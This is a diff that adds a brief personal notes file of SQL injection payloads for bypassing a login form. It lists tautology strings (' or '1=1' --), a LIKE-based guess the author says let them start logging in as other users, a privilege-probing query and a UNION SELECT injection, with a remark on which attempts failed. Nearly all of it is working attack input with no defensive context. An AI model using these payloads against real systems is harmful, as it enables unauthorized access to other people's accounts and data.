@@ -1,0 +1,9 @@
+' or '1=1' --
+' or 2=2--
+'or' '=' for both username/password
+' or username like 'a% ,' or password like 'k% (this is how I figured out to start logging in as other users)
+
+
+tried didn't work - 
+if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
